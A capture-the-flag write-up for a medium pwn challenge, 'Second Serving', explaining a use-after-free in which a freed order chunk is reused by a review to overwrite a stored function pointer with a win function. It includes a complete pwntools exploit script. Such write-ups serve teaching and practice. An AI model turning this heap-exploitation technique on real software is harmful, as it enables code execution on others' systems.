+++
date = '2026-03-03'
title = 'Second Serving'
tags = ['pwn', 'medium']
+++

Category: Pwn

Difficulty: Medium (438 points)

Author: Julian Dotrepppe

## Description

Welcome to Second Serving, the city's hottest new restaurant! Our famous chef guarantees every dish is made fresh to order, and if you're not satisfied, we'll happily take it back.

Word on the street is the chef keeps a very exclusive recipe locked away in the kitchen. Think you can get your hands on it?

## Challenge files

[second_serving](second_serving)

## Observations

Running the program we get this output.
```
================================
  Welcome to Second Serving!
  Fine dining, no waiting.
================================

--- Menu ---
1. Place an order
2. View an order
3. Cancel an order
4. Leave a review
5. Exit
> 
```

So the operations we have are:
1. Place an order which allocates a 0x40 bytes chunk
2. View an order which prints the order
3. Cancel an order which frees the order's memory.
4. Create a review which allocates a 0x40 bytes chunk.

Something interesting about how this is all implemented is create actually stores the address of a function to view the order.
```c
sVar2 = strcspn(__s,"\n");
__s[sVar2] = '\0';
*(code **)(__s + 0x38) = display_order;  // <--- Here
*(char **)(orders + (long)local_c * 8) = __s;
printf("Order #%d placed: %s\n",(ulong)(local_c + 1),__s);
```

This is called by the view order operation to print the order. Additionally there is a use after free in cancel order. And finally there is a win function that prints the flag.

## Solution

So as you've probably guessed by reading the observations, we will be overwriting the address of the called function. To do this we do the following:

1. Create an order, the content of the order doesn't matter
2. Cancel the created order, the pointer to this order and the function is not deleted.
3. Write a review, which does just store a string in memory, this will be created at the same address as our order. So we write 0x38 bytes of padding data, 
   and in the last 8 bytes we put the address of the win function, this is the place where the address of the `display_order` function used to be.
4. Now view the order, since there is a use after free vulnerability this will call the function stored, which we have overwritten to the win function, printing the flag. 

## Solution script

```py
from pwn import *

elf = ELF('second_serving')
win_address = elf.symbols['win']

process = elf.process()

# Place an order
process.sendlineafter(b">", b"1")
process.sendlineafter(b"What would you like to order?", b"a")

# Delete the order
process.sendlineafter(b">", b"3")
process.sendlineafter(b"Which order to cancel? (1-5)", b"1")

# Create a review, which will reuse the freed chunk, allowing us to inject the win() address
process.sendlineafter(b">", b"4")
payload = b"A" * (0x38) + p64(win_address)
print(len(payload))
process.sendlineafter(b"Leave your review (64 bytes max):", payload)

# Now view the first order, triggering win!
process.sendlineafter(b">", b"2")
process.sendlineafter(b"Which order? (1-5)", b"1")

process.interactive()
```